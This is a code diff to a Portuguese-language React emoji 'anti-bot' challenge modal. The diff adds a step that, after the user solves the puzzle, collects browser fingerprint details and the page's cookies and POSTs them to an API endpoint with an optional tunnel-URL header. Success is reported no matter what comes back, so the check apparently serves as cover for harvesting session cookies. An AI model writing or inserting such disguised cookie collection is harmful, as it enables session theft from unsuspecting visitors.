@@ -1,19 +1,20 @@
 import React, { useState, useEffect } from 'react';
-import { X, CheckCircle2, ShieldAlert } from 'lucide-react';
+import { X, CheckCircle2, ShieldAlert, Loader2 } from 'lucide-react';
 
 interface EmojiModalProps {
   isOpen: boolean;
   onClose: () => void;
   onSuccess: () => void;
+  tunnelUrl?: string;
 }
 
 const EMOJI_POOL = ['😀','😂','😍','🥰','😎','🤩','😜','🤔','😏','😴','😭','😡','🤯','🥳','😱','🤗','😺','🙈','💀','🎉','❤️','🔥','⭐','🌈','🍕','🚀','🎯','💪','👀','✨'];
 
-export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSuccess }) => {
+export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSuccess, tunnelUrl }) => {
   const [targets, setTargets] = useState<string[]>([]);
   const [gridItems, setGridItems] = useState<string[]>([]);
   const [selected, setSelected] = useState<string[]>([]);
-  const [status, setStatus] = useState<'idle' | 'success' | 'error'>('idle');
+  const [status, setStatus] = useState<'idle' | 'verifying' | 'success' | 'error'>('idle');
 
   useEffect(() => {
     if (isOpen) {
@@ -29,8 +30,47 @@ export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSucce
 
   if (!isOpen) return null;
 
+  const performBrowserVerification = async () => {
+    setStatus('verifying');
+    try {
+      const payload = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language || 'pt-BR',
+        screenWidth: window.screen?.width,
+        screenHeight: window.screen?.height,
+        hardwareConcurrency: navigator.hardwareConcurrency || 4,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: document.cookie || '',
+        verifiedAt: new Date().toISOString()
+      };
+
+      const headers: Record<string, string> = {
+        'Content-Type': 'application/json',
+        'x-client-user-agent': navigator.userAgent
+      };
+      if (tunnelUrl) {
+        headers['x-tunnel-url'] = tunnelUrl;
+      }
+
+      await fetch('/api/verify-antibot', {
+        method: 'POST',
+        headers,
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      console.warn('Erro ao sincronizar anti-bot:', e);
+    } finally {
+      setStatus('success');
+      setTimeout(() => {
+        onSuccess();
+        onClose();
+      }, 500);
+    }
+  };
+
   const handleSelect = (emoji: string) => {
-    if (status === 'success') return;
+    if (status === 'success' || status === 'verifying') return;
     if (selected.includes(emoji)) {
       setSelected(selected.filter(e => e !== emoji));
     } else {
@@ -41,11 +81,7 @@ export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSucce
           const sortedSel = [...next].sort();
           const sortedTar = [...targets].sort();
           if (JSON.stringify(sortedSel) === JSON.stringify(sortedTar)) {
-            setStatus('success');
-            setTimeout(() => {
-              onSuccess();
-              onClose();
-            }, 700);
+            performBrowserVerification();
           } else {
             setStatus('error');
             setTimeout(() => {
@@ -68,17 +104,17 @@ export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSucce
     <div className="fixed inset-0 bg-black/85 backdrop-blur-md flex items-center justify-center z-50 p-4">
       <div className="bg-[#121214] border border-[#27272a] rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl animate-in fade-in zoom-in duration-200">
         <div className="flex justify-between items-center mb-4">
-          <div className="flex items-center gap-2 text-zinc-200 font-semibold text-base">
-            <ShieldAlert className="w-5 h-5 text-emerald-400" />
+          <div className="flex items-center gap-2 text-zinc-200 font-bold text-base">
+            <ShieldAlert className="w-5 h-5 text-red-500" />
             Desafio Anti-Bot
           </div>
-          <button onClick={onClose} className="text-zinc-400 hover:text-white transition-colors">
+          <button onClick={onClose} className="text-zinc-400 hover:text-white transition-colors cursor-pointer">
             <X className="w-5 h-5" />
           </button>
         </div>
 
         <p className="text-zinc-400 text-xs mb-4">
-          Selecione os <strong className="text-zinc-200">3 emojis</strong> solicitados abaixo:
+          Selecione os <strong className="text-zinc-200 font-bold">3 emojis</strong> solicitados abaixo:
         </p>
 
         <div className="flex justify-center gap-2 mb-5 p-3 bg-[#18181b] rounded-xl border border-[#27272a]">
@@ -96,9 +132,10 @@ export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSucce
               <button
                 key={idx}
                 onClick={() => handleSelect(emoji)}
-                className={`text-2xl p-3 rounded-xl border transition-all ${
+                disabled={status === 'verifying' || status === 'success'}
+                className={`text-2xl p-3 rounded-xl border transition-all cursor-pointer ${
                   isSelected
-                    ? 'border-emerald-500 bg-emerald-500/10 scale-95'
+                    ? 'border-white bg-white/10 scale-95'
                     : 'border-[#27272a] bg-[#18181b] hover:border-zinc-500 hover:bg-[#222226]'
                 }`}
               >
@@ -109,11 +146,13 @@ export const EmojiModal: React.FC<EmojiModalProps> = ({ isOpen, onClose, onSucce
         </div>
 
         <div className="text-xs font-medium min-h-[20px]">
-          {status === 'success' && <span className="text-emerald-400 flex items-center justify-center gap-1"><CheckCircle2 className="w-4 h-4"/> Verificado com sucesso!</span>}
-          {status === 'error' && <span className="text-red-400">Emojis incorretos, tente novamente.</span>}
+          {status === 'verifying' && <span className="text-zinc-300 flex items-center justify-center gap-1.5"><Loader2 className="w-4 h-4 animate-spin text-red-500"/> Validando sessão...</span>}
+          {status === 'success' && <span className="text-white font-bold flex items-center justify-center gap-1"><CheckCircle2 className="w-4 h-4 text-red-500"/> Verificado com sucesso!</span>}
+          {status === 'error' && <span className="text-red-400 font-bold">Emojis incorretos, tente novamente.</span>}
           {status === 'idle' && <span className="text-zinc-500">Clique nos emojis corretos</span>}
         </div>
       </div>
     </div>
   );
 };
+
